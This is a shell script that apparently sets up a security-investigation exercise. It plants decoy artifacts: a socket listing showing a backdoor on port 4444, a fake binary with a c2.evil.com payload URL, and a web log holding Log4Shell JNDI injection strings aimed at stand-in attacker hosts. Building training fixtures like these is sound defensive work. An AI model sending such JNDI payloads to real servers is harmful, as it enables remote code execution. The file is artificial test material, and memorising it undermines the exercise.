#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip binutils
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    mkdir -p /home/user/investigation

    # 1. ss_output.txt
    cat << 'EOF' > /home/user/investigation/ss_output.txt
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port  Process
tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*      users:(("sshd",pid=882,fd=3))
tcp    LISTEN  0       511            0.0.0.0:80           0.0.0.0:*      users:(("nginx",pid=991,fd=5))
tcp    LISTEN  0       10             0.0.0.0:4444         0.0.0.0:*      users:(("backdoor",pid=9042,fd=4))
tcp    LISTEN  0       128               [::]:22              [::]:*      users:(("sshd",pid=882,fd=4))
EOF

    # 2. backdoor_bin
    cat << 'EOF' > /home/user/investigation/backdoor_bin
\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00
Some random binary garbage here...
Mozilla/5.0 (Windows NT 10.0; Win64; x64)
https://c2.evil.com/payload
/bin/sh
/etc/passwd
More garbage...
EOF

    # 3. access.log
    cat << 'EOF' > /home/user/investigation/access.log
198.51.100.22 - - [10/Oct/2023:13:55:36 +0000] "GET /index.html HTTP/1.1" 200 612
203.0.113.45 - - [10/Oct/2023:13:56:01 +0000] "GET /?q=${jndi:ldap://attacker.com/a} HTTP/1.1" 404 232
198.51.100.22 - - [10/Oct/2023:13:57:11 +0000] "GET /about.html HTTP/1.1" 200 1023
203.0.113.88 - - [10/Oct/2023:13:58:22 +0000] "GET /login?user=${jndi:ldap://bad-guy.net/Exploit} HTTP/1.1" 500 110
203.0.113.45 - - [10/Oct/2023:13:59:05 +0000] "POST /api/data?val=${jndi:ldap://attacker.com/b} HTTP/1.1" 403 155
10.0.0.5 - - [10/Oct/2023:14:00:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4501
EOF

    # 4. csp.txt
    cat << 'EOF' > /home/user/investigation/csp.txt
HTTP/1.1 200 OK
Date: Tue, 10 Oct 2023 14:00:00 GMT
Server: nginx/1.18.0
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://trusted.cdn.com https://analytics.site.com; object-src 'none';
Content-Type: text/html; charset=UTF-8
EOF

    chmod -R 777 /home/user
